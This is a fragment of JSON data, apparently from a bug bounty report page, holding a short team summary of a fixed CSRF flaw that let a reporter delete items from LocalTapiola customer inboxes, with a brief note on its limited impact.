,"new_scope":"verkkopalvelu.tapiola.fi","genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":3449,"category":"team","content":"##Issue\nThe reporter was able to remove items from the customer inbox due to missing CSRF-token protection. The exploit required the user (victim) to have a valid and active session in the service.\n\n##Fix\n\nThe application was fixed.\n\n##Reasoning\n\nCSRF can potentially be very serious. In this case, the impact was limited in many ways due to the fact that the attacker needed the victim to have an active session and that the victim was recently active in his/her customer inbox.","can_view?":true,"can_edit?":false,"content_html":"\u003ch2 id=\"issue\"\u003eIssue\u003c/h2\u003e\n\n\u003cp\u003eThe reporter was able to remove items from the customer inbox due to missing CSRF-token protection. The exploit required the user (victim) to have a valid and active session in the service.\u003c/p\u003e\n\n\u003ch2 id=\"fix\"\u003eFix\u003c/h2\u003e\n\n\u003cp\u003eThe application was fixed.\u003c/p\u003e\n\n\u003ch2 id=\"reasoning\"\u003eReasoning\u003c/h2\u003e\n\n\u003cp\u003eCSRF can potentially be very serious. In this case, the impact was limited in many ways due to the fact that the attacker needed the victim to have an active session and that the victim was recently active in his/her customer inbox.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}